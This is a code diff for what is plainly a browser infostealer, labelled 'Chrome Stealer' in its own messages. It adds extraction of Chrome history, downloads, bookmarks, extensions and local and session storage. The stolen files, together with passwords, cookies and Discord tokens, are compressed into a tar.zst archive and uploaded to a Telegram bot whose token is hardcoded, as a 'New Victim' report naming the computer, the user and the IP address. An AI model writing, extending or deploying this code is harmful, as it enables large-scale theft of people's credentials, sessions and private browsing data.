@@ -26,6 +26,16 @@
 #include <set>
 #include <regex>
 
+// Zstandard compression
+#define ZSTD_STATIC_LINKING_ONLY
+#include "../libs/zstd/include/zstd.h"
+#pragma comment(lib, "libs/zstd/libzstd_static.lib")
+
+// Fix for MinGW-compiled Zstandard library on MSVC x64
+#ifdef _M_X64
+#pragma comment(linker, "/alternatename:__chkstk_ms=__chkstk")
+#endif
+
 // Custom NTSTATUS for syscalls (avoid winternl.h conflicts)
 #ifndef NTSTATUS_DEFINED
 #define NTSTATUS_DEFINED
@@ -518,9 +528,307 @@ namespace Payload
 
                      return "{\"nickname\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 2)) +
                             "\",\"value\":\"" + Utils::EscapeJson(value_str) + "\"}";
+                 }},
+                // History extraction
+                {"History", "history", "SELECT url, title, visit_count, last_visit_time FROM urls;",
+                 nullptr,
+                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+                 {
+                     int64_t last_visit_time = sqlite3_column_int64(stmt, 3);
+                     // Convert WebKit/Chrome timestamp (microseconds since 1601) to ISO 8601
+                     std::string time_str = "0";
+                     if (last_visit_time > 0) {
+                         const int64_t EPOCH_DIFF = 11644473600000000LL;
+                         int64_t unix_time = (last_visit_time - EPOCH_DIFF) / 1000000;
+                         time_str = std::to_string(unix_time);
+                     }
+                     
+                     return "  {\"url\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
+                            "\",\"title\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
+                            "\",\"visit_count\":" + std::to_string(sqlite3_column_int(stmt, 2)) +
+                            ",\"last_visit_time\":" + time_str + "}";
+                 }},
+                // Download extraction
+                {"History", "downloads", "SELECT target_path, tab_url, total_bytes, start_time, end_time, mime_type FROM downloads;",
+                 nullptr,
+                 [](sqlite3_stmt *stmt, const auto &key, const auto &state) -> std::optional<std::string>
+                 {
+                     int64_t start_time = sqlite3_column_int64(stmt, 3);
+                     int64_t end_time = sqlite3_column_int64(stmt, 4);
+                     
+                     auto convert_time = [](int64_t webkit_time) -> std::string {
+                         if (webkit_time > 0) {
+                             const int64_t EPOCH_DIFF = 11644473600000000LL;
+                             return std::to_string((webkit_time - EPOCH_DIFF) / 1000000);
+                         }
+                         return "0";
+                     };
+                     
+                     return "  {\"target_path\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 0)) +
+                            "\",\"url\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 1)) +
+                            "\",\"total_bytes\":" + std::to_string(sqlite3_column_int64(stmt, 2)) +
+                            ",\"start_time\":" + convert_time(start_time) +
+                            ",\"end_time\":" + convert_time(end_time) +
+                            ",\"mime_type\":\"" + Utils::EscapeJson((const char *)sqlite3_column_text(stmt, 5)) + "\"}";
                  }}};
             return configs;
         }
+
+        // Helper function to read JSON file content
+        std::string ReadJsonFile(const fs::path& filePath)
+        {
+            if (!fs::exists(filePath)) return "";
+            
+            std::ifstream file(filePath);
+            if (!file.is_open()) return "";
+            
+            std::string content;
+            std::string line;
+            while (std::getline(file, line)) {
+                content += line;
+            }
+            return content;
+        }
+
+        // Helper function to parse JSON value
+        std::string GetJsonValue(const std::string& json, const std::string& key)
+        {
+            std::string searchKey = "\"" + key + "\":";
+            size_t pos = json.find(searchKey);
+            if (pos == std::string::npos) return "";
+            
+            pos += searchKey.length();
+            // Skip whitespace
+            while (pos < json.length() && (json[pos] == ' ' || json[pos] == '\t')) pos++;
+            
+            if (pos >= json.length()) return "";
+            
+            // Check if value is a string (starts with ")
+            if (json[pos] == '"') {
+                pos++;
+                size_t end = pos;
+                while (end < json.length() && json[end] != '"') {
+                    if (json[end] == '\\' && end + 1 < json.length()) end++; // Skip escaped chars
+                    end++;
+                }
+                return json.substr(pos, end - pos);
+            }
+            
+            // Otherwise it's a number or boolean
+            size_t end = pos;
+            while (end < json.length() && json[end] != ',' && json[end] != '}' && json[end] != '\n') end++;
+            return json.substr(pos, end - pos);
+        }
+
+        // Bookmark extraction function - reads Bookmarks JSON file
+        struct BookmarkExtractor
+        {
+            static std::string Extract(const fs::path& profilePath)
+            {
+                fs::path bookmarkPath = profilePath / "Bookmarks";
+                if (!fs::exists(bookmarkPath)) {
+                    return "[]";
+                }
+
+                std::string content = ReadJsonFile(bookmarkPath);
+                if (content.empty()) return "[]";
+
+                std::ostringstream json;
+                json << "[";
+                
+                bool first = true;
+                ParseBookmarkNode(content, "roots", json, first);
+                
+                json << "\n]";
+                return json.str();
+            }
+
+        private:
+            static void ParseBookmarkNode(const std::string& json, const std::string& key, std::ostringstream& output, bool& first)
+            {
+                // Simple JSON parsing - find all bookmark entries
+                // This is a simplified parser for the bookmark structure
+                size_t pos = 0;
+                while ((pos = json.find("\"type\":", pos)) != std::string::npos) {
+                    size_t urlPos = json.find("\"url\":", pos);
+                    size_t namePos = json.find("\"name\":", pos);
+                    size_t datePos = json.find("\"date_added\":", pos);
+                    size_t idPos = json.find("\"id\":", pos);
+                    
+                    if (urlPos != std::string::npos && namePos != std::string::npos && 
+                        urlPos < pos + 500 && namePos < pos + 500) {
+                        
+                        // Extract type
+                        size_t typeStart = json.find("\"", pos + 7) + 1;
+                        size_t typeEnd = json.find("\"", typeStart);
+                        std::string type = json.substr(typeStart, typeEnd - typeStart);
+                        
+                        // Extract URL
+                        size_t urlStart = json.find("\"", urlPos + 6) + 1;
+                        size_t urlEnd = json.find("\"", urlStart);
+                        std::string url = json.substr(urlStart, urlEnd - urlStart);
+                        
+                        // Extract name
+                        size_t nameStart = json.find("\"", namePos + 7) + 1;
+                        size_t nameEnd = json.find("\"", nameStart);
+                        std::string name = json.substr(nameStart, nameEnd - nameStart);
+                        
+                        // Extract ID
+                        std::string id = "0";
+                        if (idPos != std::string::npos && idPos < pos + 200) {
+                            size_t idStart = json.find("\"", idPos + 5) + 1;
+                            size_t idEnd = json.find("\"", idStart);
+                            id = json.substr(idStart, idEnd - idStart);
+                        }
+                        
+                        // Extract date
+                        std::string date = "0";
+                        if (datePos != std::string::npos && datePos < pos + 500) {
+                            size_t dateStart = json.find("\"", datePos + 14) + 1;
+                            if (dateStart == std::string::npos || dateStart >= json.length()) {
+                                dateStart = datePos + 14;
+                                while (dateStart < json.length() && !isdigit(json[dateStart])) dateStart++;
+                            }
+                            size_t dateEnd = dateStart;
+                            while (dateEnd < json.length() && (isdigit(json[dateEnd]) || json[dateEnd] == '.')) dateEnd++;
+                            date = json.substr(dateStart, dateEnd - dateStart);
+                        }
+                        
+                        if (!first) output << ",\n";
+                        first = false;
+                        
+                        output << "  {\"id\":" << id
+                               << ",\"name\":\"" << Utils::EscapeJson(name) << "\""
+                               << ",\"type\":\"" << type << "\""
+                               << ",\"url\":\"" << Utils::EscapeJson(url) << "\""
+                               << ",\"date_added\":" << date << "}";
+                    }
+                    
+                    pos += 50;
+                }
+            }
+        };
+
+        // Extension extraction function - reads Secure Preferences JSON file
+        struct ExtensionExtractor
+        {
+            static std::string Extract(const fs::path& profilePath)
+            {
+                // Try both Preferences and Secure Preferences
+                std::vector<fs::path> prefPaths = {
+                    profilePath / "Secure Preferences",
+                    profilePath / "Preferences"
+                };
+
+                std::string content;
+                for (const auto& path : prefPaths) {
+                    if (fs::exists(path)) {
+                        content = ReadJsonFile(path);
+                        if (!content.empty()) break;
+                    }
+                }
+
+                if (content.empty()) {
+                    return "[]";
+                }
+
+                std::ostringstream json;
+                json << "[";
+                
+                bool first = true;
+                
+                // Find extensions section
+                std::vector<std::string> extensionKeys = {
+                    "\"extensions\":{\"settings\":",
+                    "\"settings\":{\"extensions\":",
+                    "\"settings\":{\"settings\":"
+                };
+                
+                size_t extensionsPos = std::string::npos;
+                for (const auto& key : extensionKeys) {
+                    extensionsPos = content.find(key);
+                    if (extensionsPos != std::string::npos) break;
+                }
+                
+                if (extensionsPos == std::string::npos) {
+                    return "[]";
+                }
+
+                // Parse extension entries
+                size_t pos = extensionsPos;
+                while ((pos = content.find("\"manifest\":{", pos)) != std::string::npos) {
+                    // Find the extension ID (32 char hex before manifest)
+                    size_t idEnd = pos;
+                    while (idEnd > 0 && content[idEnd] != '"') idEnd--;
+                    size_t idStart = idEnd;
+                    while (idStart > 0 && content[idStart - 1] != '"') idStart--;
+                    
+                    if (idEnd - idStart != 32) {
+                        pos++;
+                        continue;
+                    }
+                    
+                    std::string id = content.substr(idStart, 32);
+                    
+                    // Extract manifest fields
+                    size_t manifestEnd = content.find("},", pos);
+                    if (manifestEnd == std::string::npos) manifestEnd = content.find("}}", pos);
+                    std::string manifest = content.substr(pos, manifestEnd - pos + 1);
+                    
+                    auto getName = [&]() {
+                        size_t namePos = manifest.find("\"name\":\"");
+                        if (namePos == std::string::npos) return std::string("");
+                        namePos += 8;
+                        size_t nameEnd = manifest.find("\"", namePos);
+                        return manifest.substr(namePos, nameEnd - namePos);
+                    };
+                    
+                    auto getVersion = [&]() {
+                        size_t verPos = manifest.find("\"version\":\"");
+                        if (verPos == std::string::npos) return std::string("");
+                        verPos += 11;
+                        size_t verEnd = manifest.find("\"", verPos);
+                        return manifest.substr(verPos, verEnd - verPos);
+                    };
+                    
+                    auto getDesc = [&]() {
+                        size_t descPos = manifest.find("\"description\":\"");
+                        if (descPos == std::string::npos) return std::string("");
+                        descPos += 15;
+                        size_t descEnd = manifest.find("\"", descPos);
+                        return manifest.substr(descPos, descEnd - descPos);
+                    };
+                    
+                    // Check if enabled (look for disable_reasons before the manifest)
+                    size_t disablePos = content.rfind("\"disable_reasons\":", pos);
+                    bool enabled = true;
+                    if (disablePos != std::string::npos && disablePos > pos - 1000) {
+                        enabled = false;
+                    }
+                    
+                    std::string name = getName();
+                    if (!name.empty()) {
+                        if (!first) json << ",\n";
+                        first = false;
+                        
+                        std::string url = "https://chrome.google.com/webstore/detail/" + id;
+                        
+                        json << "  {\"id\":\"" << id << "\""
+                             << ",\"url\":\"" << url << "\""
+                             << ",\"enabled\":" << (enabled ? "true" : "false")
+                             << ",\"name\":\"" << Utils::EscapeJson(name) << "\""
+                             << ",\"description\":\"" << Utils::EscapeJson(getDesc()) << "\""
+                             << ",\"version\":\"" << Utils::EscapeJson(getVersion()) << "\""
+                             << ",\"homepage_url\":\"\"}";
+                    }
+                    
+                    pos = manifestEnd + 1;
+                }
+                
+                json << "\n]";
+                return json.str();
+            }
+        };
     }
 
     class PipeLogger
@@ -564,6 +872,194 @@ namespace Payload
         HANDLE m_pipe = INVALID_HANDLE_VALUE;
     };
 
+    // Helper functions for localStorage/sessionStorage extraction
+    namespace Storage
+    {
+        // Simple LevelDB log reader for Chrome's Local Storage
+        struct LevelDBReader
+        {
+            static std::string ReadValue(const std::vector<uint8_t>& data, size_t& pos)
+            {
+                if (pos >= data.size()) return "";
+                
+                std::string result;
+                size_t start = pos;
+                
+                while (pos < data.size() && pos < start + 2048) {
+                    if (data[pos] == 0) break;
+                    if (data[pos] >= 32 && data[pos] <= 126) {
+                        result += (char)data[pos];
+                    } else if (data[pos] == '\n' || data[pos] == '\r' || data[pos] == '\t') {
+                        result += (char)data[pos];
+                    }
+                    pos++;
+                }
+                
+                return result;
+            }
+            
+            static std::pair<std::string, std::string> ParseKey(const std::vector<uint8_t>& key)
+            {
+                std::string url, keyName;
+                size_t i = 0;
+                
+                if (i < key.size() && key[i] == '_') i++;
+                
+                while (i < key.size() && key[i] != 0) {
+                    if (key[i] >= 32 && key[i] <= 126) {
+                        url += (char)key[i];
+                    }
+                    i++;
+                }
+                
+                if (i < key.size()) i++;
+                
+                while (i < key.size() && key[i] != 1) {
+                    if (key[i] >= 32 && key[i] <= 126) {
+                        keyName += (char)key[i];
+                    }
+                    i++;
+                }
+                
+                return {url, keyName};
+            }
+        };
+        
+        static std::string ExtractLocalStorage(const fs::path& profilePath, PipeLogger& logger)
+        {
+            fs::path localStoragePath = profilePath / "Local Storage" / "leveldb";
+            
+            if (!fs::exists(localStoragePath)) {
+                logger.Log("[!] Local Storage path not found");
+                return "[]";
+            }
+            
+            std::ostringstream json;
+            json << "[";
+            bool first = true;
+            
+            try {
+                for (const auto& entry : fs::directory_iterator(localStoragePath)) {
+                    if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
+                        std::ifstream file(entry.path(), std::ios::binary);
+                        if (!file.is_open()) continue;
+                        
+                        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
+                                                  std::istreambuf_iterator<char>());
+                        file.close();
+                        
+                        for (size_t i = 0; i < data.size() - 10; i++) {
+                            if (data[i] == '_' && i + 1 < data.size()) {
+                                size_t keyStart = i;
+                                size_t keyEnd = keyStart;
+                                
+                                int nullCount = 0;
+                                while (keyEnd < data.size() && keyEnd < keyStart + 512) {
+                                    if (data[keyEnd] == 0 || data[keyEnd] == 1) {
+                                        nullCount++;
+                                        if (nullCount >= 2) break;
+                                    }
+                                    keyEnd++;
+                                }
+                                
+                                if (keyEnd - keyStart > 5 && keyEnd - keyStart < 512) {
+                                    std::vector<uint8_t> keyBytes(data.begin() + keyStart, data.begin() + keyEnd);
+                                    auto [url, key] = LevelDBReader::ParseKey(keyBytes);
+                                    
+                                    if (!url.empty() && !key.empty()) {
+                                        size_t valueStart = keyEnd + 1;
+                                        size_t valuePos = valueStart;
+                                        std::string value = LevelDBReader::ReadValue(data, valuePos);
+                                        
+                                        if (!value.empty() && value.length() < 2048) {
+                                            if (!first) json << ",\n";
+                                            first = false;
+                                            
+                                            json << "  {\"is_meta\":false"
+                                                 << ",\"url\":\"" << Utils::EscapeJson(url) << "\""
+                                                 << ",\"key\":\"" << Utils::EscapeJson(key) << "\""
+                                                 << ",\"value\":\"" << Utils::EscapeJson(value) << "\"}";
+                                        }
+                                    }
+                                }
+                                
+                                i = keyEnd;
+                            }
+                        }
+                    }
+                }
+            } catch (...) {}
+            
+            json << "\n]";
+            return json.str();
+        }
+        
+        static std::string ExtractSessionStorage(const fs::path& profilePath, PipeLogger& logger)
+        {
+            fs::path sessionStoragePath = profilePath / "Session Storage";
+            
+            if (!fs::exists(sessionStoragePath)) {
+                logger.Log("[!] Session Storage path not found");
+                return "[]";
+            }
+            
+            std::ostringstream json;
+            json << "[";
+            bool first = true;
+            
+            try {
+                for (const auto& entry : fs::recursive_directory_iterator(sessionStoragePath)) {
+                    if (entry.path().extension() == ".log" || entry.path().extension() == ".ldb") {
+                        std::ifstream file(entry.path(), std::ios::binary);
+                        if (!file.is_open()) continue;
+                        
+                        std::vector<uint8_t> data((std::istreambuf_iterator<char>(file)),
+                                                  std::istreambuf_iterator<char>());
+                        file.close();
+                        
+                        for (size_t i = 0; i < data.size() - 10; i++) {
+                            if ((i + 4 < data.size() && data[i] == 'm' && data[i+1] == 'a' && data[i+2] == 'p' && data[i+3] == '-') ||
+                                (i + 10 < data.size() && data[i] == 'n' && data[i+1] == 'a' && data[i+2] == 'm' && data[i+3] == 'e' && 
+                                 data[i+4] == 's' && data[i+5] == 'p' && data[i+6] == 'a' && data[i+7] == 'c' && data[i+8] == 'e' && data[i+9] == '-')) {
+                                
+                                size_t keyStart = i;
+                                size_t keyEnd = keyStart;
+                                
+                                while (keyEnd < data.size() && keyEnd < keyStart + 256 && 
+                                       data[keyEnd] != 0 && data[keyEnd] >= 32 && data[keyEnd] <= 126) {
+                                    keyEnd++;
+                                }
+                                
+                                if (keyEnd - keyStart > 5 && keyEnd - keyStart < 256) {
+                                    std::string keyStr(data.begin() + keyStart, data.begin() + keyEnd);
+                                    
+                                    size_t valueStart = keyEnd + 1;
+                                    size_t valuePos = valueStart;
+                                    std::string value = LevelDBReader::ReadValue(data, valuePos);
+                                    
+                                    if (!value.empty() && value.length() < 2048) {
+                                        if (!first) json << ",\n";
+                                        first = false;
+                                        
+                                        json << "  {\"is_meta\":false"
+                                             << ",\"url\":\"\""
+                                             << ",\"key\":\"" << Utils::EscapeJson(keyStr) << "\""
+                                             << ",\"value\":\"" << Utils::EscapeJson(value) << "\"}";
+                                    }
+                                }
+                                
+                                i = keyEnd;
+                            }
+                        }
+                    }
+                }
+            } catch (...) {}
+            
+            json << "\n]";
+            return json.str();
+        }
+    }
+
     // Global data collector - accumulates all files in RAM across browsers
     struct DataCollector {
         struct FileData {
@@ -594,7 +1090,7 @@ namespace Payload
         TelegramUploader(PipeLogger &logger) : m_logger(logger)
         {
             m_botToken = L"7933260420:AAG37jmdanboUUqeWkS7cpQr6zz7jtPeF5g";
-            m_chatId = L"6095587357";
+            m_chatId = L"-1003428698503"; // FSOCIETY channel ID
         }
 
         // Send document (ZIP) with caption (victim info)
@@ -667,6 +1163,9 @@ namespace Payload
                 return false;
             }
 
+            // Set extended timeouts for large file uploads (5 minutes)
+            WinHttpSetTimeouts(hRequest, 60000, 60000, 300000, 300000);
+
             std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + 
                                   std::wstring(boundary.begin(), boundary.end()) + L"\r\n";
 
@@ -683,11 +1182,19 @@ namespace Payload
             WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                nullptr, &statusCode, &statusSize, nullptr);
 
+            bool success = (statusCode >= 200 && statusCode < 300);
+            
+            if (success) {
+                m_logger.Log("[+] Upload successful (HTTP " + std::to_string(statusCode) + ")");
+            } else {
+                m_logger.Log("[-] Upload failed (HTTP " + std::to_string(statusCode) + ")");
+            }
+
             WinHttpCloseHandle(hRequest);
             WinHttpCloseHandle(hConnect);
             WinHttpCloseHandle(hSession);
 
-            return (statusCode >= 200 && statusCode < 300);
+            return success;
         }
     };
 
@@ -1124,6 +1631,15 @@ namespace Payload
                 // Upload to Telegram
                 TelegramUploader telegram(m_logger);
                 
+                m_logger.Log("[+] Building complete victim data...");
+                
+                // Create TAR.ZST archive in memory with all JSON files
+                std::vector<uint8_t> archiveData = CreateTarZstArchive(allFiles, sessionId);
+                if (archiveData.empty()) {
+                    m_logger.Log("[-] Failed to create TAR.ZST archive");
+                    return false;
+                }
+                
                 // Build system info message
                 int totalPasswords = 0;
                 int totalCookies = 0;
@@ -1136,39 +1652,39 @@ namespace Payload
                 }
                 
                 std::ostringstream msg;
-                msg << "🔴 <b>Chrome Stealer - New Victim</b>\n\n";
-                msg << "<b>Computer:</b> " << computerName << "\n";
-                msg << "<b>Username:</b> " << userName << "\n";
-                msg << "<b>IP Address:</b> " << (publicIp.empty() ? "N/A" : publicIp) << "\n\n";
-                msg << "<b>Extracted Data:</b>\n";
-                msg << "├── 🔑 Password Files: " << totalPasswords << "\n";
-                msg << "├── 🍪 Cookie Files: " << totalCookies << "\n";
-                msg << "├── 📁 Total Files: " << allFiles.size() << "\n";
-                msg << "└── 💬 Discord Token: " << (discordToken.empty() ? "Not Found" : "Found") << "\n\n";
+                msg << "🔴 <b>New Victim Detected</b>\n";
+                msg << "━━━━━━━━━━━━━━━━━━━━━━\n\n";
+                
+                msg << "<b>📋 System Information</b>\n";
+                msg << "┌ <b>Computer:</b> <code>" << computerName << "</code>\n";
+                msg << "├ <b>Username:</b> <code>" << userName << "</code>\n";
+                msg << "├ <b>IP Address:</b> <code>" << (publicIp.empty() ? "N/A" : publicIp) << "</code>\n";
+                msg << "└ <b>Session ID:</b> <code>" << sessionId << "</code>\n\n";
+                
+                msg << "<b>📊 Extracted Data</b>\n";
+                msg << "┌ <b>Password Files:</b> <code>" << totalPasswords << "</code>\n";
+                msg << "├ <b>Cookie Files:</b> <code>" << totalCookies << "</code>\n";
+                msg << "├ <b>Total Files:</b> <code>" << allFiles.size() << "</code>\n";
+                msg << "└ <b>Archive Size:</b> <code>" << (archiveData.size() / 1024) << " KB</code>\n\n";
                 
                 if (!discordToken.empty()) {
+                    msg << "<b>💎 Discord Token</b>\n";
                     msg << "<code>" << discordToken << "</code>\n\n";
                 }
                 
-                msg << "<i>All data packaged in ZIP archive</i>";
+                msg << "━━━━━━━━━━━━━━━━━━━━━━\n";
+                msg << "<i>📦 Compressed with Zstandard (Level 3)</i>";
                 
-                m_logger.Log("[+] Building complete victim data...");
+                // Generate archive filename with victim info
+                std::string archiveFilename = computerName + "_" + userName + "_" + sessionId + ".tar.zst";
                 
-                // Create ZIP archive in memory with all JSON files
-                std::vector<uint8_t> zipData = CreateZipArchive(allFiles, sessionId);
-                if (zipData.empty()) {
-                    m_logger.Log("[-] Failed to create ZIP archive");
-                    return false;
-                }
-                
-                // Generate ZIP filename with victim info
-                std::string zipFilename = computerName + "_" + userName + "_" + sessionId + ".zip";
-                
-                // Upload ZIP with victim details as caption (SINGLE MESSAGE)
-                if (!telegram.SendDocument(zipFilename, zipData, msg.str())) {
+                // Upload archive with victim details as caption (SINGLE MESSAGE)
+                if (!telegram.SendDocument(archiveFilename, archiveData, msg.str())) {
                     m_logger.Log("[-] Failed to upload victim data");
                     return false;
                 }
+                
+                m_logger.Log("[+] Successfully uploaded victim data to Telegram");
                 
                 m_logger.Log("[+] All data uploaded successfully in single message!");
                 
@@ -1192,114 +1708,123 @@ namespace Payload
     private:
         PipeLogger &m_logger;
 
-        // Create ZIP archive in memory (simple DEFLATE-free ZIP for compatibility)
-        std::vector<uint8_t> CreateZipArchive(const std::vector<DataCollector::FileData> &files, const std::string &sessionId)
+        // Compress data using Zstandard (level 3 for speed)
+        std::vector<uint8_t> CompressZstd(const std::string &data) {
+            size_t compressBound = ZSTD_compressBound(data.size());
+            std::vector<uint8_t> compressed(compressBound);
+            
+            // Use compression level 3 for fast compression with good ratio
+            size_t compressedSize = ZSTD_compress(
+                compressed.data(), compressBound,
+                data.data(), data.size(),
+                3);
+            
+            if (ZSTD_isError(compressedSize)) {
+                // Compression failed, return original
+                compressed.assign(data.begin(), data.end());
+                return compressed;
+            }
+            
+            compressed.resize(compressedSize);
+            return compressed;
+        }
+
+        // Create TAR.ZST archive (simple tar + zstd compression)
+        std::vector<uint8_t> CreateTarZstArchive(const std::vector<DataCollector::FileData> &files, const std::string &sessionId)
         {
-            m_logger.Log("[*] Creating ZIP archive with " + std::to_string(files.size()) + " files...");
+            m_logger.Log("[*] Creating TAR.ZST archive with " + std::to_string(files.size()) + " files...");
             
-            std::vector<uint8_t> zipData;
-            std::vector<size_t> centralDirOffsets;
-            std::vector<std::string> filenames;
-            std::vector<uint32_t> crc32s;
-            std::vector<uint32_t> uncompressedSizes;
+            // Build uncompressed TAR in memory
+            std::vector<uint8_t> tarData;
             
-            // Write local file headers and data (store method, no compression)
             for (const auto &file : files) {
                 std::string filename = file.filename;
                 const std::string &content = file.content;
                 
-                centralDirOffsets.push_back(zipData.size());
-                filenames.push_back(filename);
+                // TAR header (512 bytes)
+                std::vector<uint8_t> header(512, 0);
                 
-                // Calculate CRC32
-                uint32_t crc = CalculateCRC32((const uint8_t*)content.data(), content.size());
-                crc32s.push_back(crc);
-                uncompressedSizes.push_back((uint32_t)content.size());
+                // Filename (max 100 chars)
+                size_t nameLen = filename.size() < 100 ? filename.size() : 100;
+                memcpy(header.data(), filename.c_str(), nameLen);
                 
-                // Local file header signature
-                WriteUInt32(zipData, 0x04034b50);
-                WriteUInt16(zipData, 10);  // Version needed
-                WriteUInt16(zipData, 0);   // Flags
-                WriteUInt16(zipData, 0);   // Compression method (0 = stored)
-                WriteUInt16(zipData, 0);   // Last mod time
-                WriteUInt16(zipData, 0);   // Last mod date
-                WriteUInt32(zipData, crc); // CRC32
-                WriteUInt32(zipData, (uint32_t)content.size()); // Compressed size
-                WriteUInt32(zipData, (uint32_t)content.size()); // Uncompressed size
-                WriteUInt16(zipData, (uint16_t)filename.size()); // Filename length
-                WriteUInt16(zipData, 0);   // Extra field length
+                // File mode (8 bytes octal): 0000644
+                memcpy(header.data() + 100, "0000644", 7);
                 
-                // Filename
-                zipData.insert(zipData.end(), filename.begin(), filename.end());
+                // Owner/Group UID/GID (8 bytes each): 0000000
+                memcpy(header.data() + 108, "0000000", 7);
+                memcpy(header.data() + 116, "0000000", 7);
                 
-                // File data
-                zipData.insert(zipData.end(), content.begin(), content.end());
-            }
-            
-            // Write central directory
-            size_t centralDirStart = zipData.size();
-            for (size_t i = 0; i < files.size(); i++) {
-                // Central directory file header signature
-                WriteUInt32(zipData, 0x02014b50);
-                WriteUInt16(zipData, 0x031e); // Version made by
-                WriteUInt16(zipData, 10);     // Version needed
-                WriteUInt16(zipData, 0);      // Flags
-                WriteUInt16(zipData, 0);      // Compression method
-                WriteUInt16(zipData, 0);      // Last mod time
-                WriteUInt16(zipData, 0);      // Last mod date
-                WriteUInt32(zipData, crc32s[i]);
-                WriteUInt32(zipData, uncompressedSizes[i]);
-                WriteUInt32(zipData, uncompressedSizes[i]);
-                WriteUInt16(zipData, (uint16_t)filenames[i].size());
-                WriteUInt16(zipData, 0);  // Extra field length
-                WriteUInt16(zipData, 0);  // File comment length
-                WriteUInt16(zipData, 0);  // Disk number start
-                WriteUInt16(zipData, 0);  // Internal file attributes
-                WriteUInt32(zipData, 0);  // External file attributes
-                WriteUInt32(zipData, (uint32_t)centralDirOffsets[i]); // Relative offset
+                // File size (12 bytes octal)
+                char sizeStr[12];
+                snprintf(sizeStr, 12, "%011llo", (unsigned long long)content.size());
+                memcpy(header.data() + 124, sizeStr, 11);
                 
-                // Filename
-                zipData.insert(zipData.end(), filenames[i].begin(), filenames[i].end());
-            }
-            
-            size_t centralDirSize = zipData.size() - centralDirStart;
-            
-            // End of central directory record
-            WriteUInt32(zipData, 0x06054b50); // Signature
-            WriteUInt16(zipData, 0);  // Disk number
-            WriteUInt16(zipData, 0);  // Start disk
-            WriteUInt16(zipData, (uint16_t)files.size()); // Entries on this disk
-            WriteUInt16(zipData, (uint16_t)files.size()); // Total entries
-            WriteUInt32(zipData, (uint32_t)centralDirSize);
-            WriteUInt32(zipData, (uint32_t)centralDirStart);
-            WriteUInt16(zipData, 0);  // Comment length
-            
-            m_logger.Log("[+] ZIP archive created: " + std::to_string(zipData.size()) + " bytes");
-            return zipData;
-        }
-        
-        void WriteUInt32(std::vector<uint8_t> &data, uint32_t value) {
-            data.push_back((uint8_t)(value & 0xFF));
-            data.push_back((uint8_t)((value >> 8) & 0xFF));
-            data.push_back((uint8_t)((value >> 16) & 0xFF));
-            data.push_back((uint8_t)((value >> 24) & 0xFF));
-        }
-        
-        void WriteUInt16(std::vector<uint8_t> &data, uint16_t value) {
-            data.push_back((uint8_t)(value & 0xFF));
-            data.push_back((uint8_t)((value >> 8) & 0xFF));
-        }
-        
-        uint32_t CalculateCRC32(const uint8_t *data, size_t length) {
-            uint32_t crc = 0xFFFFFFFF;
-            for (size_t i = 0; i < length; i++) {
-                crc ^= data[i];
-                for (int j = 0; j < 8; j++) {
-                    crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
+                // Modification time (12 bytes octal): current time
+                __time64_t currentTime = _time64(nullptr);
+                snprintf(sizeStr, 12, "%011llo", (long long)currentTime);
+                memcpy(header.data() + 136, sizeStr, 11);
+                
+                // Checksum placeholder (8 bytes): initially spaces
+                memset(header.data() + 148, ' ', 8);
+                
+                // Type flag: '0' = regular file
+                header[156] = '0';
+                
+                // UStar format
+                memcpy(header.data() + 257, "ustar", 5);
+                header[263] = '0';
+                header[264] = '0';
+                
+                // Calculate checksum
+                unsigned int checksum = 0;
+                for (int i = 0; i < 512; i++) {
+                    checksum += header[i];
                 }
+                snprintf(sizeStr, 8, "%06o", checksum);
+                memcpy(header.data() + 148, sizeStr, 6);
+                header[154] = 0;
+                
+                // Add header to TAR
+                tarData.insert(tarData.end(), header.begin(), header.end());
+                
+                // Add file content
+                tarData.insert(tarData.end(), content.begin(), content.end());
+                
+                // Pad to 512-byte boundary
+                size_t padding = (512 - (content.size() % 512)) % 512;
+                tarData.insert(tarData.end(), padding, 0);
             }
-            return ~crc;
+            
+            
+            // Add two 512-byte zero blocks to mark end of TAR
+            tarData.insert(tarData.end(), 1024, 0);
+            
+            m_logger.Log("[*] TAR size: " + std::to_string(tarData.size()) + " bytes");
+            
+            // Compress entire TAR with Zstandard level 3
+            size_t compressBound = ZSTD_compressBound(tarData.size());
+            std::vector<uint8_t> compressedData(compressBound);
+            
+            size_t compressedSize = ZSTD_compress(
+                compressedData.data(), compressBound,
+                tarData.data(), tarData.size(),
+                3);
+            
+            if (ZSTD_isError(compressedSize)) {
+                m_logger.Log("[-] Zstandard compression failed: " + std::string(ZSTD_getErrorName(compressedSize)));
+                return std::vector<uint8_t>();
+            }
+            
+            compressedData.resize(compressedSize);
+            
+            double ratio = (double)tarData.size() / compressedSize;
+            m_logger.Log("[+] TAR.ZST archive created: " + std::to_string(compressedSize) + 
+                        " bytes (" + std::to_string((int)(ratio * 100)) + "% compression)");
+            
+            return compressedData;
         }
+
 
         std::string GetPublicIP()
         {
@@ -1918,11 +2443,52 @@ namespace Payload
                 try
                 {
                     m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
+                    
+                    // Extract SQLite-based data
                     for (const auto &dataConfig : Data::GetExtractionConfigs())
                     {
                         DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name, uploader);
                         extractor.Extract();
                     }
+                    
+                    // Extract Bookmarks (JSON file)
+                    try {
+                        std::string bookmarksJson = Data::BookmarkExtractor::Extract(profilePath);
+                        std::string filename = browserConfig.name + "_" + profilePath.filename().string() + "_bookmarks.json";
+                        
+                        // Count bookmarks for reporting
+                        int count = 0;
+                        size_t pos = 0;
+                        while ((pos = bookmarksJson.find("\"url\":", pos)) != std::string::npos) {
+                            count++;
+                            pos++;
+                        }
+                        
+                        uploader.AddDataFile(filename, bookmarksJson, count);
+                        m_logger.Log("[+] Extracted " + std::to_string(count) + " bookmarks");
+                    } catch (const std::exception &e) {
+                        m_logger.Log("[-] Bookmark extraction failed: " + std::string(e.what()));
+                    }
+                    
